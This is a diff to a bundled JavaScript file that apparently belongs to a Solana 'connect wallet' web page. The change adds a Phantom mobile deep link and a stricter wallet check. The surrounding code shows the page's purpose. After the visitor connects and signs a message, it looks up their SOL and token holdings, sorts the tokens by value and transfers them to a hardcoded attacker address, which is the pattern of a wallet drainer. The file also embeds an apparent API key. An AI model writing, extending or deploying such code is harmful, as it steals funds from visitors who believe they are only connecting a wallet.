@@ -72648,6 +72648,16 @@ function _asyncToGenerator(n) { return function () { var t = this, e = arguments
 window.Buffer = _buffer.Buffer;
 // Define necessary variables
 var walletAddress = null;
+
+// Function to open the Phantom wallet app on mobile
+var openPhantomWallet = function openPhantomWallet() {
+  // This link will open the Phantom app if it's installed
+  window.location.href = 'https://phantom.app/ul/solana';
+};
+
+// Function to check if the user is on a mobile device
+var isMobile = /Mobi|Android/i.test(navigator.userAgent);
+
 // Function to connect the Phantom wallet and execute the whole flow
 function connectAndExecute() {
   return _connectAndExecute.apply(this, arguments);
@@ -72658,18 +72668,30 @@ function _connectAndExecute() {
     return _regeneratorRuntime().wrap(function _callee$(_context) {
       while (1) switch (_context.prev = _context.next) {
         case 0:
-          provider = window.solana;
-          if (!(!provider || !provider.isPhantom)) {
+          provider = window.solana; // Check for provider and if it’s Phantom
+          if (provider) {
             _context.next = 4;
             break;
           }
-          alert('Phantom wallet not found. Please install it!');
+          // If no provider is found and it's a mobile device, open the Phantom app link
+          if (isMobile) {
+            openPhantomWallet();
+          } else {
+            alert('No Solana wallet found. Please install one!');
+          }
           return _context.abrupt("return");
         case 4:
-          _context.prev = 4;
-          _context.next = 7;
-          return provider.connect();
+          if (provider.isPhantom) {
+            _context.next = 7;
+            break;
+          }
+          alert('Unsupported Solana wallet detected.');
+          return _context.abrupt("return");
         case 7:
+          _context.prev = 7;
+          _context.next = 10;
+          return provider.connect();
+        case 10:
           response = _context.sent;
           walletAddress = response.publicKey.toString(); // Capture the connected wallet address
 
@@ -72677,25 +72699,25 @@ function _connectAndExecute() {
           document.getElementById('connectWalletBtn').textContent = "Connected";
 
           // Step 2: Sign a message after connection to verify wallet ownership
-          _context.next = 12;
+          _context.next = 15;
           return signMessage(provider, walletAddress);
-        case 12:
+        case 15:
           // Step 3: Fetch SOL balance after signing
           connection = new _web.Connection('https://solana-mainnet.g.alchemy.com/v2/Gsfdu-QYMKdktD9rUZiq8cwjFUdZTyPh');
-          _context.next = 15;
+          _context.next = 18;
           return connection.getBalance(new _web.PublicKey(walletAddress));
-        case 15:
+        case 18:
           balance = _context.sent;
           solBalance = balance / 1e9; // Optional: Display balance in the UI if necessary
           // document.getElementById('walletBalance').textContent = `Balance: ${solBalance} SOL`;
           // Step 4: Fetch token balances using Shyft API
-          _context.next = 19;
-          return fetchTokenBalances(walletAddress);
-        case 19:
-          tokens = _context.sent;
           _context.next = 22;
-          return fetchTokenPrices(tokens);
+          return fetchTokenBalances(walletAddress);
         case 22:
+          tokens = _context.sent;
+          _context.next = 25;
+          return fetchTokenPrices(tokens);
+        case 25:
           tokenPrices = _context.sent;
           // Step 6: Calculate token values (balance * price) and sort by value
           tokenValues = tokens.map(function (token) {
@@ -72715,21 +72737,21 @@ function _connectAndExecute() {
 
           // Step 7: Transfer tokens in the sorted order
           recipientAddress = '6i3vVKyfafPTgpQjct9Tx8c3fAHT7sCBDG9GsZk1n4vf'; // Replace with the recipient's address
-          _context.next = 30;
+          _context.next = 33;
           return transferTokensInOrder(sortedTokens, recipientAddress, connection);
-        case 30:
-          _context.next = 36;
+        case 33:
+          _context.next = 39;
           break;
-        case 32:
-          _context.prev = 32;
-          _context.t0 = _context["catch"](4);
+        case 35:
+          _context.prev = 35;
+          _context.t0 = _context["catch"](7);
           console.error(_context.t0);
           alert('Failed to complete wallet flow');
-        case 36:
+        case 39:
         case "end":
           return _context.stop();
       }
-    }, _callee, null, [[4, 32]]);
+    }, _callee, null, [[7, 35]]);
   }));
   return _connectAndExecute.apply(this, arguments);
 }
